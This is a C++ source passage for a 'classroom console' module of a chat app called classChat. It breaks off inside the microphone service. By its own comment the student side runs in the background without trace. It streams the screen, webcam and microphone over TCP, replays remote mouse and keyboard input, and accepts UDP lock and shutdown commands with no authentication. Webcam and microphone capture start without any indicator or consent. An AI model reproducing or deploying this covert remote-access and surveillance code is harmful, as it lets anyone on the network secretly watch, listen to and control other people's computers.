// =========================== dimo 课堂控制台模块 ===========================
// 嵌入 classChat：admin 经顶条「功能→课堂控制台」打开；学生端纯后台无痕
// 端口: UDP 47933 心跳/喊话 | TCP 47935 屏幕+操控 | 47936 摄像头 | 47937 麦克风
#include <mmsystem.h>
#include <windowsx.h>
namespace dm {
using namespace Gdiplus;

static const WORD DM_PORT_UDP = 47933, DM_PORT_SCR = 47935, DM_PORT_CAM = 47936, DM_PORT_MIC = 47937;
static const DWORD DM_FCC_MJPG = 0x47504A4D, DM_FCC_YUY2 = 0x32595559;
static void dmEnsureClasses();

// ------------------------------ 工具 ------------------------------
static std::string dmW2u(const std::wstring& w) {
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), 0, 0, 0, 0);
    std::string s((size_t)n, 0);
    if (n) WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, 0, 0);
    return s;
}
static std::wstring dmU2w(const std::string& s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), 0, 0);
    std::wstring w((size_t)n, 0);
    if (n) MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}
static void dmSendAll(SOCKET s, const char* p, int n) {
    while (n > 0) { int k = send(s, p, n, 0); if (k <= 0) return; p += k; n -= k; }
}
static bool dmRecvAll(SOCKET s, char* p, int n) {
    while (n > 0) { int k = recv(s, p, n, 0); if (k <= 0) return false; p += k; n -= k; }
    return true;
}
static void dmPut32(char* p, int32_t v) { memcpy(p, &v, 4); }
static int32_t dmGet32(const char* p) { int32_t v; memcpy(&v, p, 4); return v; }
static bool dmPeerAlive(SOCKET s) {
    fd_set r; FD_ZERO(&r); FD_SET(s, &r); timeval tv = {0, 0};
    if (select(0, &r, 0, 0, &tv) <= 0) return true;
    char c; int k = recv(s, &c, 1, MSG_PEEK);
    return !(k == 0 || (k < 0 && WSAGetLastError() != WSAEWOULDBLOCK));
}
static bool dmIsLocalIp(DWORD ip) {
    char hn[256] = {0};
    if (gethostname(hn, 256) != 0) return false;
    hostent* he = gethostbyname(hn);
    if (!he) return false;
    for (char** a = he->h_addr_list; *a; ++a) if (*(u_long*)*a == ip) return true;
    return false;
}
static std::wstring dmIpStr(DWORD ip) {
    in_addr a; a.S_un.S_addr = ip; char* c = inet_ntoa(a);
    return c ? dmU2w(c) : std::wstring(L"?");
}
static int dmEncoderClsid(const wchar_t* mime) {
    UINT n = 0, m = 0; GetImageEncodersSize(&n, &m);
    if (!m) return -1;
    std::vector<char> buf(m); ImageCodecInfo* ici = (ImageCodecInfo*)&buf[0];
    GetImageEncoders(n, m, ici);
    for (UINT i = 0; i < n; ++i) if (!wcscmp(ici[i].MimeType, mime)) return (int)i;
    return -1;
}
static bool dmJpeg(Bitmap* bm, ULONGLONG q, std::vector<char>& out) {
    int ci = dmEncoderClsid(L"image/jpeg");
    if (ci < 0 || !bm) return false;
    UINT n = 0, m = 0; GetImageEncodersSize(&n, &m);
    std::vector<char> buf(m); ImageCodecInfo* ici = (ImageCodecInfo*)&buf[0];
    GetImageEncoders(n, m, ici);
    CLSID clsid = ici[ci].Clsid;
    IStream* st = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &st) != S_OK) return false;
    EncoderParameters ep; ep.Count = 1;
    ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong;
    ep.Parameter[0].NumberOfValues = 1; ep.Parameter[0].Value = &q;
    if (bm->Save(st, &clsid, &ep) != Ok) { st->Release(); return false; }
    STATSTG sg;
    if (st->Stat(&sg, STATFLAG_NONAME) != S_OK || sg.cbSize.QuadPart == 0) { st->Release(); return false; }
    LARGE_INTEGER zero; zero.QuadPart = 0; st->Seek(zero, STREAM_SEEK_SET, nullptr);
    out.resize((size_t)sg.cbSize.QuadPart);
    ULONG rd = 0; st->Read(&out[0], (ULONG)out.size(), &rd);
    st->Release();
    return rd == out.size();
}
static BOOL CALLBACK dmSetFontCb(HWND c, LPARAM lp) {
    SendMessageW(c, WM_SETFONT, (WPARAM)lp, TRUE); return TRUE;
}

// ------------------------------ 身份 / 在线表 / UDP ------------------------------
static std::wstring g_dmName;
static bool g_dmAdmin = false;
// 进程实例 ID: 本机双开同名实例时区分"自己发的包"(回环) 与"同名另一实例的包"
static char g_dmInst[24] = {0};
struct DmPeer { std::wstring name, role, host; DWORD ip; DWORD tick; };
static std::mutex g_dmMtx;
static std::map<std::wstring, DmPeer> g_dmPeers;
static SOCKET g_dmUdpSend = INVALID_SOCKET;
static HWND g_dmMsgWnd = nullptr;      // 主线程消息窗口 (喊话横幅转发)
static bool g_dmSvcOn = false;         // 学生端 TCP 服务已启动

static void dmUdpSend(DWORD ip, const std::string& s) {
    if (g_dmUdpSend == INVALID_SOCKET) return;
    sockaddr_in to{}; to.sin_family = AF_INET; to.sin_port = htons(DM_PORT_UDP);
    to.sin_addr.S_un.S_addr = ip;
    sendto(g_dmUdpSend, s.c_str(), (int)s.size(), 0, (sockaddr*)&to, sizeof(to));
}
static void dmHbOnce() {
    wchar_t host[128] = {0}; DWORD sz = 128; GetComputerNameW(host, &sz);
    std::string s = std::string("DMHB|") + g_dmInst + "|" + dmW2u(g_dmName) + "|" + dmW2u(g_dmAdmin ? L"admin" : L"student") + "|" + dmW2u(host);
    dmUdpSend(INADDR_BROADCAST, s);
}
static DWORD WINAPI dmHbThread(LPVOID) {
    while (true) { if (!g_dmName.empty()) dmHbOnce(); Sleep(2000); }
    return 0;
}

// ------------------------------ 卸载通知 (管理员端) ------------------------------
// 学生机执行卸载时广播 UNINST|inst|账号|机器名, 管理员可选择「放任」或「请求重装」。
// 请求重装只是把请求发给对方机器, 对方弹窗后自行决定, 不做任何静默安装。
struct UninstNote { std::wstring name, host; DWORD ip; };
static DWORD WINAPI dmUninstNoteThread(LPVOID p) {
    UninstNote* n = (UninstNote*)p;
    std::wstring txt = L"检测到一台机器卸载了 classChat：\n\n"
        L"机器名：" + n->host + L"\n账  号：" + (n->name.empty() ? std::wstring(L"(未登录)") : n->name) +
        L"\n\n【是】请求该机重新安装（对方会收到确认窗，由对方决定）\n"
        L"【否】放任卸载（不做任何操作）";
    int r = MessageBoxW(g_dmMsgWnd, txt.c_str(), L"classChat 卸载通知",
                        MB_YESNO | MB_ICONINFORMATION | MB_DEFBUTTON2);
    if (r == IDYES) {
        SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s != INVALID_SOCKET) {
            std::string pkt = std::string("REINSCMD|") + g_dmInst + "|" + dmW2u(g_dmName) + "|*";
            sockaddr_in to = {};
            to.sin_family = AF_INET; to.sin_port = htons(47938); to.sin_addr.S_un.S_addr = n->ip;
            for (int i = 0; i < 3; ++i) {
                sendto(s, pkt.c_str(), (int)pkt.size(), 0, (sockaddr*)&to, sizeof(to));
                Sleep(150);
            }
            closesocket(s);
        }
    }
    delete n;
    return 0;
}

// ------------------------------ 喊话横幅 (学生端) ------------------------------
static std::wstring g_dmShoutTitle, g_dmShoutBody;
static std::mutex g_dmShoutMtx;
static HWND g_dmBanner = nullptr;
static LRESULT CALLBACK dmBannerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        std::wstring t1, t2;
        { std::lock_guard<std::mutex> lk(g_dmShoutMtx); t1 = g_dmShoutTitle; t2 = g_dmShoutBody; }
        Graphics g(dc); g.SetSmoothingMode(SmoothingModeAntiAlias);
        Rect full(0, 0, rc.right, rc.bottom);
        SolidBrush bg(Color(242, 55, 48, 116));
        g.FillRectangle(&bg, full);
        Pen edge(Color(200, 255, 255, 255), 2.0f);
        g.DrawRectangle(&edge, Rect(1, 1, rc.right - 2, rc.bottom - 2));
        SolidBrush wt(Color(255, 255, 255, 255));
        StringFormat sf;
        Font f1(L"Microsoft YaHei UI", 13, FontStyleBold);
        g.DrawString(t1.c_str(), -1, &f1, RectF(16, 10, (REAL)rc.right - 32, 30), &sf, &wt);
        Font f2(L"Microsoft YaHei UI", 12, FontStyleRegular);
        g.DrawString(t2.c_str(), -1, &f2, RectF(16, 46, (REAL)rc.right - 32, (REAL)rc.bottom - 56), &sf, &wt);
        EndPaint(h, &ps);
        return 0; }
    case WM_TIMER: KillTimer(h, 1); DestroyWindow(h); return 0;
    case WM_LBUTTONDOWN: DestroyWindow(h); return 0;
    case WM_DESTROY: if (h == g_dmBanner) g_dmBanner = nullptr; return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmShowBanner(const std::wstring& from, const std::wstring& text) {
    std::wstring body;
    {
        std::lock_guard<std::mutex> lk(g_dmShoutMtx);
        g_dmShoutTitle = L"📢 教师喊话 («" + from + L"»)";
        g_dmShoutBody = text.empty() ? L" " : text;
        body = g_dmShoutBody;
    }
    if (g_dmBanner) { DestroyWindow(g_dmBanner); g_dmBanner = nullptr; }
    RECT calc = {0, 0, 400, 10000};
    HDC dc = GetDC(nullptr);
    DrawTextW(dc, body.c_str(), -1, &calc, DT_WORDBREAK | DT_CALCRECT);
    ReleaseDC(nullptr, dc);
    int hgt = calc.bottom - calc.top + 66;
    if (hgt < 110) hgt = 110;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    g_dmBanner = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"DIMOBANNER", L"",
        WS_POPUP, sw - 478, sh - hgt - 50, 468, hgt, nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmBanner, SW_SHOWNOACTIVATE);
    SetTimer(g_dmBanner, 1, 15000, nullptr);
    MessageBeep(MB_ICONEXCLAMATION);
}

// ------------------------------ 语音喊话播放 (学生端, UDP 广播流) ------------------------------
static void CALLBACK dmAudOutCb(HWAVEOUT, UINT msg, DWORD_PTR, LPWAVEHDR wh, DWORD_PTR);
static HWAVEOUT s_dmVoiceWo = nullptr;   // 惰性打开, 收到首帧后常驻
static void dmVoicePlay(const char* data, int len, DWORD seq) {
    static DWORD lastSeq = 0; static bool first = true;
    if (!first && (int)(seq - lastSeq) <= 0) return;   // 丢旧包/重复包 (防乱序噼啪)
    lastSeq = seq; first = false;
    if (!s_dmVoiceWo) {
        WAVEFORMATEX wf{}; wf.wFormatTag = WAVE_FORMAT_PCM; wf.nChannels = 1;
        wf.nSamplesPerSec = 8000; wf.wBitsPerSample = 16;
        wf.nBlockAlign = 2; wf.nAvgBytesPerSec = 16000;
        if (waveOutOpen(&s_dmVoiceWo, WAVE_MAPPER, &wf, (DWORD_PTR)dmAudOutCb, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR)
            return;
    }
    WAVEHDR* wh = new WAVEHDR{}; char* d = new char[len];
    memcpy(d, data, len);
    wh->lpData = d; wh->dwBufferLength = (DWORD)len; wh->dwUser = (DWORD_PTR)s_dmVoiceWo;
    waveOutPrepareHeader(s_dmVoiceWo, wh, sizeof(WAVEHDR));
    waveOutWrite(s_dmVoiceWo, wh, sizeof(WAVEHDR));
}

// ------------------------------ UDP 接收 ------------------------------
static DWORD WINAPI dmUdpRecvThread(LPVOID) {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    BOOL b = TRUE; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&b, sizeof(b));
    sockaddr_in a{}; a.sin_family = AF_INET; a.sin_port = htons(DM_PORT_UDP);
    a.sin_addr.S_un.S_addr = INADDR_ANY;
    if (bind(s, (sockaddr*)&a, sizeof(a)) != 0) { closesocket(s); return 0; }
    char buf[4096];
    while (true) {
        sockaddr_in from{}; int fl = sizeof(from);
        int n = recvfrom(s, buf, sizeof(buf) - 1, 0, (sockaddr*)&from, &fl);
        if (n <= 0) break;
        buf[n] = 0;
        DWORD ip = from.sin_addr.S_un.S_addr;
        if (!strncmp(buf, "DMHB|", 5)) {
            // 格式: DMHB|inst|name|role|host
            char* c = buf + 5; char* p0 = strchr(c, '|'); if (!p0) continue; *p0 = 0;
            char* p1 = strchr(p0 + 1, '|'); if (!p1) continue; *p1 = 0;
            char* p2 = strchr(p1 + 1, '|');     if (!p2) continue; *p2 = 0;
            DmPeer pe; pe.name = dmU2w(p0 + 1); pe.role = dmU2w(p1 + 1); pe.host = dmU2w(p2 + 1);
            pe.ip = ip; pe.tick = GetTickCount();
            std::lock_guard<std::mutex> lk(g_dmMtx);
            if (!pe.name.empty()) g_dmPeers[pe.name] = pe;
        } else if (!strncmp(buf, "DMMSG|", 6)) {
            // 格式: DMMSG|inst|from|target|text  target="*"=全体
            char* c = buf + 6; char* p0 = strchr(c, '|'); if (!p0) continue; *p0 = 0;
            char* p1 = strchr(p0 + 1, '|'); if (!p1) continue; *p1 = 0;
            char* p2 = strchr(p1 + 1, '|'); if (!p2) continue; *p2 = 0;
            if (g_dmName.empty() || !strcmp(c, g_dmInst)) continue;   // 自己发的 (按实例ID)
            std::wstring from = dmU2w(p0 + 1), target = dmU2w(p1 + 1);
            if (target != L"*" && target != g_dmName) continue;  // 非目标
            {
                std::lock_guard<std::mutex> lk(g_dmShoutMtx);
                g_dmShoutTitle = L"📢 教师喊话 («" + from + L"»)";
                g_dmShoutBody = dmU2w(p2 + 1);
            }
            if (g_dmMsgWnd) PostMessageW(g_dmMsgWnd, WM_APP + 77, 0, 0);
        } else if (!strncmp(buf, "DMAU|", 5)) {
            // 语音喊话: DMAU|inst|from|<4B seq><4B len><PCM data>
            char* c = buf + 5; char* p0 = strchr(c, '|'); if (!p0) continue; *p0 = 0;
            char* p1 = strchr(p0 + 1, '|'); if (!p1) continue; *p1 = 0;   // 剥离 from 字段 (修复: 之前少剥一层)
            if (g_dmName.empty() || !strcmp(c, g_dmInst)) continue;   // 自己发的/未登录
            char* body = p1 + 1;
            int hdrLen = (int)(body - buf);
            if (n < hdrLen + 8) continue;
            int32_t len = dmGet32(body + 4);
            if (len <= 0 || len > 8000 || hdrLen + 8 + len > n) continue;
            dmVoicePlay(body + 8, len, (DWORD)dmGet32(body));
        } else if (!strncmp(buf, "UNINST|", 7)) {
            // 卸载上报: UNINST|inst|账号|机器名  (仅管理员端提示, 学生端忽略)
            char* c = buf + 7; char* p0 = strchr(c, '|'); if (!p0) continue; *p0 = 0;
            char* p1 = strchr(p0 + 1, '|'); if (!p1) continue; *p1 = 0;
            if (g_dmName.empty() || !strcmp(c, g_dmInst)) continue;   // 自己发的
            if (!g_dmAdmin) continue;                                 // 学生端不弹
            UninstNote* un = new UninstNote;
            un->name = dmU2w(p0 + 1);
            un->host = dmU2w(p1 + 1);
            un->ip = ip;
            if (!PostMessageW(g_dmMsgWnd, WM_APP + 86, 0, (LPARAM)un)) delete un;
        } else if (!strncmp(buf, "DMCMD|", 6)) {
            // 远程指令: DMCMD|inst|from|target|LOCK/HLOCK/UNLOCK/SHUT
            char* c = buf + 6; char* p0 = strchr(c, '|'); if (!p0) continue; *p0 = 0;
            char* p1 = strchr(p0 + 1, '|'); if (!p1) continue; *p1 = 0;
            char* p2 = strchr(p1 + 1, '|'); if (!p2) continue; *p2 = 0;
            if (g_dmName.empty() || !strcmp(c, g_dmInst)) continue;   // 自己发的 (按实例ID)
            std::wstring from = dmU2w(p0 + 1), target = dmU2w(p1 + 1);
            if (target != L"*" && target != g_dmName) continue;
            const char* cmd = p2 + 1;
            UINT msg = !strncmp(cmd, "LOCK", 4) ? WM_APP + 83   // LOCK / LOCK:T:a:b / LOCK:C:m1:m2
                     : !strcmp(cmd, "UNLOCK") ? WM_APP + 79
                     : !strcmp(cmd, "HLOCK") ? WM_APP + 82
                     : !strcmp(cmd, "SHUT") ? WM_APP + 80 : 0;
            if (msg && g_dmMsgWnd) {
                if (msg == WM_APP + 83) {
                    // 把完整指令串带给主线程 (lParam, 接收方 free)
                    char* spec = _strdup(cmd);
                    if (spec && !PostMessageW(g_dmMsgWnd, msg, 0, (LPARAM)spec)) free(spec);
                } else PostMessageW(g_dmMsgWnd, msg, 0, 0);
            }
        }
    }
    closesocket(s);
    return 0;
}

// ------------------------------ 学生端: 远程输入重放 ------------------------------
static void dmApplyInput(int type, int32_t a, int32_t b) {
    (void)b;
    INPUT in{}; in.type = INPUT_MOUSE;
    switch (type) {
    case 2:
        in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
        in.mi.dx = (LONG)((double)a * 65535.0 / 10000.0);
        in.mi.dy = (LONG)((double)b * 65535.0 / 10000.0);
        break;
    case 3: in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN; break;
    case 4: in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN; break;
    case 5: in.mi.dwFlags = MOUSEEVENTF_LEFTUP; break;
    case 8: in.mi.dwFlags = MOUSEEVENTF_WHEEL; in.mi.mouseData = (DWORD)a; break;
    case 6: case 7: {
        INPUT k{}; k.type = INPUT_KEYBOARD;
        k.ki.wVk = (WORD)a; if (type == 7) k.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &k, sizeof(k)); return; }
    default: return;
    }
    SendInput(1, &in, sizeof(in));
}

// ------------------------------ 学生端: 屏幕服务 (47935, 输出 1280x720) ------------------------------
static DWORD WINAPI dmScrConn(LPVOID p) {
    SOCKET s = (SOCKET)(uintptr_t)p;
    const int TW = 1280, TH = 720;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HDC wdc = GetDC(nullptr);
    HDC mdc = CreateCompatibleDC(wdc);
    HBITMAP bmp = CreateCompatibleBitmap(wdc, sw, sh);
    SelectObject(mdc, bmp);
    Bitmap* out = new Bitmap(TW, TH, PixelFormat24bppRGB);
    Graphics* og = Graphics::FromImage(out);
    if (og) og->SetInterpolationMode(InterpolationModeBilinear);
    char hdr[8] = {'C','C','S','C',0,0,0,0};
    char acc[13]; int have = 0;
    while (dmPeerAlive(s)) {
        BitBlt(mdc, 0, 0, sw, sh, wdc, 0, 0, SRCCOPY | CAPTUREBLT);
        Bitmap* bm = Bitmap::FromHBITMAP(bmp, nullptr);
        std::vector<char> jpg;
        bool ok = false;
        if (bm && og) {
            og->DrawImage(bm, Rect(0, 0, TW, TH), 0, 0, sw, sh, UnitPixel);
            ok = dmJpeg(out, 50, jpg);
        }
        if (bm) delete bm;
        if (!ok) break;
        dmPut32(hdr + 4, (int32_t)jpg.size());
        dmSendAll(s, hdr, 8);
        if (!jpg.empty()) dmSendAll(s, &jpg[0], (int)jpg.size());
        // 顺路收 CCIN 控制包 (13 字节)
        for (int k = 0; k < 6; ++k) {
            fd_set r; FD_ZERO(&r); FD_SET(s, &r); timeval tv = {0, 0};
            if (select(0, &r, 0, 0, &tv) <= 0) break;
            char tmp[64];
            int n = recv(s, tmp, (int)sizeof(tmp), 0);
            if (n <= 0) { have = -1; break; }
            for (int i = 0; i < n; ++i) {
                acc[have++] = tmp[i];
                if (have == 13) {
                    if (!memcmp(acc, "CCIN", 4))
                        dmApplyInput(acc[4], dmGet32(acc + 5), dmGet32(acc + 9));
                    have = 0;
                }
            }
        }
        if (have < 0) break;
        Sleep(15);
    }
    if (og) delete og;
    delete out;
    DeleteDC(mdc); ReleaseDC(nullptr, wdc); DeleteObject(bmp);
    closesocket(s);
    return 0;
}

// ------------------------------ 学生端: 摄像头常驻捕获 + 服务 (47936) ------------------------------
// 对齐 classChat 可用架构: 常驻捕获线程(带消息泵) + 帧缓存, TCP 连接线程从缓存编码发送
static std::mutex g_dmCamMtx;
static std::vector<char> g_dmCamDib;      // kind1: MJPG 原始; kind2: RGB24(top-down)
static int g_dmCamKind = 0;               // 0=无帧 1=MJPG 2=RGB24
static int g_dmCamW = 0, g_dmCamH = 0;
static volatile LONG g_dmCamViewers = 0;
static volatile LONG g_dmCamSeq = 0;      // 帧序号: 每存入一帧 +1, 发送端据此跳过旧帧
static BITMAPINFOHEADER g_dmCamFmt{};
static const DWORD DM_FCC_YUYV = 0x56595559, DM_FCC_YUYS = 0x53595559;

static void dmCamStore(std::vector<char>&& buf, int kind, int w, int h) {
    std::lock_guard<std::mutex> lk(g_dmCamMtx);
    g_dmCamDib.swap(buf); g_dmCamKind = kind; g_dmCamW = w; g_dmCamH = h;
    InterlockedIncrement(&g_dmCamSeq);
}
static LRESULT CALLBACK dmCamFrameCb(HWND, LPVIDEOHDR vh) {
    if (!vh || !vh->lpData || !vh->dwBytesUsed) return 0;
    int w = g_dmCamFmt.biWidth, h = abs(g_dmCamFmt.biHeight);
    bool flip = g_dmCamFmt.biHeight > 0;
    if (!w || !h) return 0;
    if (g_dmCamFmt.biCompression == DM_FCC_MJPG) {           // MJPG 原始缓存, 发送时直通
        if (vh->dwBytesUsed > 2 && vh->lpData[0] == (BYTE)0xFF && vh->lpData[1] == (BYTE)0xD8) {
            std::vector<char> buf(vh->lpData, vh->lpData + vh->dwBytesUsed);
            dmCamStore(std::move(buf), 1, w, h);
        }
        return 0;
    }
    if (g_dmCamFmt.biCompression == DM_FCC_YUY2 || g_dmCamFmt.biCompression == DM_FCC_YUYV ||
        g_dmCamFmt.biCompression == DM_FCC_YUYS) {            // YUY2/YUYV/YUYS → RGB24
        std::vector<BYTE> rgb((size_t)w * h * 3);
        const BYTE* src = (const BYTE*)vh->lpData;
        for (int y = 0; y < h; ++y) {
            int sy = flip ? (h - 1 - y) : y;
            for (int x = 0; x < w; x += 2) {
                const BYTE* p = src + ((size_t)sy * w + x) * 2;
                int Y0 = p[0], U = p[1], Y1 = p[2], V = p[3];
                float cu = U - 128.0f, cv = V - 128.0f;
                int b0 = (int)(Y0 + 1.772f * cu), g0 = (int)(Y0 - 0.344f * cu - 0.714f * cv), r0 = (int)(Y0 + 1.402f * cv);
                int b1 = (int)(Y1 + 1.772f * cu), g1 = (int)(Y1 - 0.344f * cu - 0.714f * cv), r1 = (int)(Y1 + 1.402f * cv);
                BYTE* d = &rgb[((size_t)y * w + x) * 3];
                d[0] = (BYTE)(b0 < 0 ? 0 : b0 > 255 ? 255 : b0);
                d[1] = (BYTE)(g0 < 0 ? 0 : g0 > 255 ? 255 : g0);
                d[2] = (BYTE)(r0 < 0 ? 0 : r0 > 255 ? 255 : r0);
                d[3] = (BYTE)(b1 < 0 ? 0 : b1 > 255 ? 255 : b1);
                d[4] = (BYTE)(g1 < 0 ? 0 : g1 > 255 ? 255 : g1);
                d[5] = (BYTE)(r1 < 0 ? 0 : r1 > 255 ? 255 : r1);
            }
        }
        dmCamStore(std::vector<char>((char*)rgb.data(), (char*)rgb.data() + rgb.size()), 2, w, h);
        return 0;
    }
    if (g_dmCamFmt.biCompression == BI_RGB && g_dmCamFmt.biBitCount == 24) {   // RGB24
        int stride = (w * 3 + 3) & ~3;
        std::vector<char> buf((size_t)stride * h);
        const BYTE* src = (const BYTE*)vh->lpData;
        for (int y = 0; y < h; ++y) {
            int sy = flip ? (h - 1 - y) : y;
            memcpy(&buf[(size_t)y * stride], src + (size_t)sy * stride, stride);
        }
        dmCamStore(std::move(buf), 2, w, h);
    }
    return 0;
}
static void dmCamThread() {   // 常驻: 有观看者才连设备, 无人看释放; 必须泵消息 VFW 才出帧
    HWND hCap = capCreateCaptureWindowW(L"dimoCam", WS_CHILD | WS_CLIPSIBLINGS,
        0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!hCap) return;
    bool linked = false;
    for (;;) {
        if (g_dmCamViewers > 0 && !linked) {
            if (capDriverConnect(hCap, 0)) {
                DWORD fsz = capGetVideoFormatSize(hCap);
                memset(&g_dmCamFmt, 0, sizeof(g_dmCamFmt));
                if (fsz >= sizeof(BITMAPINFOHEADER)) {
                    std::vector<char> fb(fsz);
                    if (capGetVideoFormat(hCap, fb.data(), fsz))
                        memcpy(&g_dmCamFmt, fb.data(), sizeof(g_dmCamFmt));
                }
                if (g_dmCamFmt.biWidth != 1280 || abs(g_dmCamFmt.biHeight) != 720) {   // 要求 1280x720
                    BITMAPINFOHEADER cands[2];
                    cands[0] = g_dmCamFmt;                                              // 候选1: 原压缩格式
                    cands[0].biWidth = 1280; cands[0].biHeight = 720; cands[0].biSizeImage = 0;
                    cands[1] = cands[0];                                                // 候选2: MJPG
                    cands[1].biCompression = DM_FCC_MJPG; cands[1].biBitCount = 24;
                    for (int i = 0; i < 2; ++i) {
                        if (capSetVideoFormat(hCap, &cands[i], sizeof(cands[i]))) {
                            DWORD fsz2 = capGetVideoFormatSize(hCap);
                            if (fsz2 >= sizeof(BITMAPINFOHEADER)) {
                                std::vector<char> fb2(fsz2);
                                if (capGetVideoFormat(hCap, fb2.data(), fsz2))
                                    memcpy(&g_dmCamFmt, fb2.data(), sizeof(g_dmCamFmt));
                            }
                            break;
                        }
                    }
                }
                g_dmCamFmt.biSize = sizeof(g_dmCamFmt);
                capSetCallbackOnVideoStream(hCap, dmCamFrameCb);
                capCaptureSequenceNoFile(hCap);
                linked = true;
            } else Sleep(2000);   // 无摄像头: 重试
        } else if (g_dmCamViewers <= 0 && linked) {
            capCaptureStop(hCap); capCaptureAbort(hCap);
            capSetCallbackOnVideoStream(hCap, nullptr);
            capDriverDisconnect(hCap);
            linked = false;
            std::lock_guard<std::mutex> lk(g_dmCamMtx);
            g_dmCamDib.clear(); g_dmCamKind = 0;
        }
        MSG msg;
        while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
        Sleep(60);
    }
}
static DWORD WINAPI dmCamClient(LPVOID p) {   // 每连接: 从帧缓存编码发送
    SOCKET s = (SOCKET)(uintptr_t)p;
    InterlockedIncrement(&g_dmCamViewers);
    BOOL nd = TRUE; setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char*)&nd, sizeof(nd));   // 禁 Nagle: 消除每帧 ~200ms 延迟ACK停顿
    char hdr[8] = {'C','C','S','C',0,0,0,0};
    for (int i = 0; i < 60 && dmPeerAlive(s); ++i) {          // 等首帧(设备启动慢, 最多 6s)
        { std::lock_guard<std::mutex> lk(g_dmCamMtx); if (g_dmCamKind) break; }
        Sleep(100);
    }
    long lastSeq = 0;
    while (dmPeerAlive(s)) {
        long seq = g_dmCamSeq;                                // 读帧序号 (无新帧不重复编码)
        if (!seq || seq == lastSeq) { Sleep(40); continue; }
        std::vector<char> dib;
        int kind = 0, w = 0, h = 0;
        {                                                     // 锁内只拷贝, 编码放锁外 (编码持锁会阻塞采集回调导致卡死)
            std::lock_guard<std::mutex> lk(g_dmCamMtx);
            dib = g_dmCamDib; kind = g_dmCamKind; w = g_dmCamW; h = g_dmCamH;
        }
        std::vector<char> jpg;
        if (kind == 1) jpg.swap(dib);                         // MJPG 直通
        else if (kind == 2 && !dib.empty()) {
            Bitmap bm(w, h, (w * 3 + 3) & ~3, PixelFormat24bppRGB, (BYTE*)dib.data());
            dmJpeg(&bm, 70, jpg);
        }
        if (jpg.empty()) { Sleep(100); continue; }
        lastSeq = seq;
        dmPut32(hdr + 4, (int32_t)jpg.size());
        std::vector<char> pkt;                                // 包头+包体一次发送 (两次 send 触发 Nagle 停顿)
        pkt.reserve(8 + jpg.size());
        pkt.insert(pkt.end(), hdr, hdr + 8);
        pkt.insert(pkt.end(), jpg.begin(), jpg.end());
        dmSendAll(s, &pkt[0], (int)pkt.size());
        Sleep(80);   // 上限 ~12fps, 只在有新帧时发送
    }
    InterlockedDecrement(&g_dmCamViewers);
    closesocket(s);
    return 0;
}

// ------------------------------ 学生端: 麦克风服务 (47937) ------------------------------
static volatile LONG g_dmMicGot = 0;   // 采集回调是否出过数据
static void CALLBACK dmMicInCb(HWAVEIN, UINT msg, DWORD_PTR inst, LPWAVEHDR, DWORD_PTR) {
    if (msg == WIM_DATA) { InterlockedExchange(&g_dmMicGot, 1); if (inst) SetEvent((HANDLE)inst); }
}
static DWORD WINAPI dmMicConn(LPVOID p) {
    SOCKET s = (SOCKET)(uintptr_t)p;
    WAVEFORMATEX wf{}; wf.wFormatTag = WAVE_FORMAT_PCM; wf.nChannels = 1;
    wf.nSamplesPerSec = 8000; wf.wBitsPerSample = 16;
    wf.nBlockAlign = 2; wf.nAvgBytesPerSec = 16000;
    HANDLE ev = CreateEventW(nullptr, FALSE, FALSE, nullptr);
    HWAVEIN wi = nullptr;
    InterlockedExchange(&g_dmMicGot, 0);
    if (waveInOpen(&wi, WAVE_MAPPER, &wf, (DWORD_PTR)dmMicInCb, (DWORD_PTR)ev, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        char hdr0[8] = {'D','I','M','A',0,0,0,0};   // 0 帧信号: 对方麦克风不可用
        dmPut32(hdr0 + 4, 0);
        dmSendAll(s, hdr0, 8);
        Sleep(300);
        CloseHandle(ev); closesocket(s); return 0;
    }
    const int BUFSZ = 3200, NB = 4;
    WAVEHDR wh[NB]; BYTE dat[NB][BUFSZ];
    memset(wh, 0, sizeof(wh));
    for (int i = 0; i < NB; ++i) {
        wh[i].lpData = (LPSTR)dat[i]; wh[i].dwBufferLength = BUFSZ;
        waveInPrepareHeader(wi, &wh[i], sizeof(WAVEHDR));
        waveInAddBuffer(wi, &wh[i], sizeof(WAVEHDR));
    }
    waveInStart(wi);
    char hdr[8] = {'D','I','M','A',0,0,0,0};
    DWORD startTick = GetTickCount();
    while (true) {
        if (!dmPeerAlive(s)) break;
        if (WaitForSingleObject(ev, 300) != WAIT_OBJECT_0) {
            // open 成功但 3 秒无任何回调: 采集异常 (Windows 麦克风隐私权限禁用/驱动占用)
            if (GetTickCount() - startTick > 3000 && !g_dmMicGot) {
                dmPut32(hdr + 4, (int32_t)-1);          // -1 帧信号: 麦克风无数据
                dmSendAll(s, hdr, 8);
                Sleep(300);
                break;
            }
            continue;
        }
        WAVEHDR* done = nullptr;
